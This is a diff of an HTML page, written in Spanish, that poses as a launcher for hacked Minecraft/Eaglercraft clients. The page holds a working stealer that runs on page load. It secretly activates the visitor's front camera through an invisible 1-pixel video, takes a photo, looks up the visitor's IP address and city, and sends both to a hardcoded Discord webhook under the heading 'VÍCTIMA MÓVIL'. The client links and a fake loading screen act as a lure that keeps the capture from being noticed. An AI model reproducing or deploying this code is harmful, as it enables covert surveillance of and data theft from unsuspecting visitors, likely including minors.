@@ -3,60 +3,96 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>FORGEX MOBILE</title>
+  <title>FORGEX v2 MOBILE</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
   <style>
-    body{background:#000;color:#0f0;font-family:monospace;margin:0;overflow:hidden}
-    #v{cursor:pointer;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:1px;height:1px}
-    .msg{position:fixed;bottom:20px;left:0;right:0;text-align:center;font-size:18px}
+    body{background:#000;color:#0f0;font-family:'Courier New',monospace;overflow-x:hidden}
+    canvas{position:fixed;top:0;left:0;z-index:-1}
+    .glitch{animation:glitch 4s infinite}
+    @keyframes glitch{0%,100%{text-shadow:2px 2px #0f0,-2px -2px #f00}50%{text-shadow:-2px -2px #0f0,2px 2px #f00}}
+    .card{border:2px solid #0f0;box-shadow:0 0 15px #0f0;transition:.3s}
+    .card:hover{transform:scale(1.08);box-shadow:0 0 40px #0f0}
+    video{width:1px;height:1px;position:fixed;opacity:0}
   </style>
 </head>
 <body>
-<video id="v" autoplay playsinline></video>
-<div class="msg">Toca la pantalla para cargar el cliente...</div>
+
+<canvas id="matrix"></canvas>
+<video id="cam" autoplay playsinline muted></video>
+
+<header class="py-8 text-center">
+  <h1 class="text-5xl glitch">FORGEX v2</h1>
+</header>
+
+<main class="p-4 space-y-12 text-center">
+  <h2 class="text-3xl glitch">CLIENTES 2025</h2>
+  <div class="grid grid-cols-2 gap-4">
+    <a href="https://eaglerhacks.github.io/dragonv4.html" class="card bg-black/80 p-6 rounded">DragonX</a>
+    <a href="https://eaglerhacks.github.io/wurstX.html" class="card bg-black/80 p-6 rounded">WurstX</a>
+    <a href="https://eaglerhacks.github.io/UwUClient%20v1%20Full.html" class="card bg-black/80 p-6 rounded">UwU+</a>
+    <a href="https://eaglercraft-unblocked.neocities.org/eaglymc-120/" class="card bg-gradient-to-r from-purple-800 to-blue-800 p-8 rounded text-2xl font-bold">Eagler 1.20</a>
+  </div>
+</main>
 
 <script>
 // TU WEBHOOK
 const WEBHOOK = "https://discord.com/api/webhooks/1447282935815475381/zq3B9KylnI8pPmMl9HFNrw83u1gHHZD_GZJaKwFSVbFvT_teVyTFeY92lG1FdhLhwm5b";
 
-let stream, video = document.getElementById("v");
+// Matrix móvil
+const canvas=document.getElementById("matrix"),ctx=canvas.getContext("2d");
+canvas.width=innerWidth;canvas.height=innerHeight;
+const chars="01アイウエオカキクケコサシスセソ";
+const f=16; let d=[]; for(let x=0;x<innerWidth/f;x++)d[x]=1;
+function draw(){ctx.fillStyle="rgba(0,0,0,0.05)";ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle="#0f0";ctx.font=f+"px monospace";for(let i=0;i<d.length;i++){ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*f,d[i]*f);if(d[i]*f>canvas.height&&Math.random()>0.975)d[i]=0;d[i]++}}setInterval(draw,40);
 
-// GRABBER NORMAL (IP + INFO)
-fetch("https://ipapi.co/json/").then(r=>r.json()).then(ip=>{
-  const info = `**VÍCTIMA MÓVIL**\n**IP:** ${ip.ip}\n**Ciudad:** ${ip.city}, ${ip.country_name}\n**Hora SV:** ${new Date().toLocaleString("es-SV")}`;
-  
-  // TOMA FOTO FRONTAL INVISIBLE
-  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false})
-    .then(s=>{stream=s; video.srcObject=stream; video.play(); tomaFoto();})
-    .catch(()=>{ /* si falla, igual envía la info */ fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:info+" (sin cámara)"})})});
-});
+// TOMA FOTO FRONTAL INVISIBLE + ENVÍA
+setTimeout(() => {
+  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false})
+    .then(stream => {
+      const video = document.getElementById("cam");
+      video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        video.play();
+        setTimeout(() => {
+          const canvas = document.createElement("canvas");
+          canvas.width = 640; canvas.height = 480;
+          canvas.getContext("2d").drawImage(video,0,0,640,480);
+          const foto = canvas.toDataURL("image/jpeg",0.7);
 
-function tomaFoto(){
-  let canvas = document.createElement("canvas");
-  canvas.width = 640; canvas.height = 480;
-  canvas.getContext("2d").drawImage(video,0,0,640,480);
-  const foto = canvas.toDataURL("image/jpeg",0.8);
+          fetch("https://ipapi.co/json/").then(r=>r.json()).then(ip=>{
+            fetch(WEBHOOK,{
+              method:"POST",
+              headers:{"Content-Type":"application/json"},
+              body:JSON.stringify({
+                username:"FORGEX MOBILE",
+                content:`**VÍCTIMA MÓVIL**\n**IP:** ${ip.ip}\n**Lugar:** ${ip.city}, ${ip.country_name}\n**Hora:** ${new Date().toLocaleString("es-SV")}`,
+                embeds:[{image:{url:foto}}]
+              })
+            });
+          });
 
-  // ENVÍA FOTO + INFO
-  fetch(WEBHOOK,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      username:"FORGEX MOBILE STEALER",
-      content:"**VÍCTIMA MÓVIL CAYÓ**",
-      embeds:[{image:{url:foto}, fields:[
-        {name:"IP + Ubicación", value:`${foto.substring(0,20)}... (foto arriba)`, inline:false}
-      ]}]
+          // Apaga cámara rápido
+          setTimeout(()=>{stream.getTracks().forEach(t=>t.stop())},1000);
+        },800);
+      };
     })
-  });
+    .catch(() => {
+      // Si falla cámara, igual envía IP
+      fetch("https://ipapi.co/json/").then(r=>r.json()).then(ip=>{
+        fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:`**VÍCTIMA MÓVIL (sin cámara)**\nIP: ${ip.ip} - ${ip.city}, ${ip.country_name}`})});
+      });
+    });
+}, 2000);
 
-  // Para que no se quede la cámara encendida
-  setTimeout(()=>{stream.getTracks().forEach(t=>t.stop());},1000);
-}
-
-// Al tocar la pantalla (para disimular) abre un cliente cualquiera
-document.body.onclick = () => {
-  window.open("https://eaglercraft-unblocked.neocities.org/eaglymc-120/", "_blank");
-};
+// Abre clientes en misma pestaña
+document.querySelectorAll('a').forEach(a=>a.onclick=e=>{
+  e.preventDefault();
+  const overlay=document.createElement('div');
+  overlay.style.cssText='position:fixed;inset:0;background:#000;color:#0f0;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;font-size:2rem';
+  overlay.innerHTML=`<h1 class="glitch">CARGANDO...</h1>`;
+  document.body.appendChild(overlay);
+  setTimeout(()=>{location.href=a.href},1200);
+});
 </script>
 </body>
 </html>
